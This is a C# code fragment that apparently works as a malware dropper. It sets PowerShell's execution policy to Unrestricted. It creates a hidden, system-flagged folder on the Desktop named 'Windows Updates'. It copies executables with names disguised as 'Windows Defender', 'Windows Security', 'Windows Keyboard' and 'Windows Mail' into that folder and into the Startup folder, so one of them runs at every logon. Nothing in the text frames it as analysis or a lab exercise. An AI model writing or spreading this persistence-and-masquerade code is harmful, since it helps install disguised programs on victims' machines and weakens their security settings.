using System;
using System.IO;

// ...

// Set execution policy
PowerShell ps = PowerShell.Create();
ps.AddCommand("Set-ExecutionPolicy")
  .AddParameter("Scope", "CurrentUser")
  .AddParameter("ExecutionPolicy", "Unrestricted")
  .AddParameter("Force");
ps.Invoke();

// Create directory
string directoryPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Desktop", "Windows Updates");
Directory.CreateDirectory(directoryPath);
File.SetAttributes(directoryPath, FileAttributes.Hidden | FileAttributes.System);

// Copy file.exe to Windows startup folder
string startupFolderPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft", "Windows", "Start Menu", "Programs", "Startup");
File.Copy("Windows Defender.exe", Path.Combine(startupFolderPath, "Windows Defender.exe"), false);

// Copy file2.exe, file3.exe, and file4.exe to Desktop
string windowsUpdatesPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Desktop", "Windows Updates");
File.Copy("Windows Keyboard.exe", Path.Combine(windowsUpdatesPath, "Windows Keyboard.exe"), false);
File.Copy("Windows Security.exe", Path.Combine(windowsUpdatesPath, "Windows Security.exe"), false);
File.Copy("Windows Mail.exe", Path.Combine(windowsUpdatesPath, "Windows Mail.exe"), false);
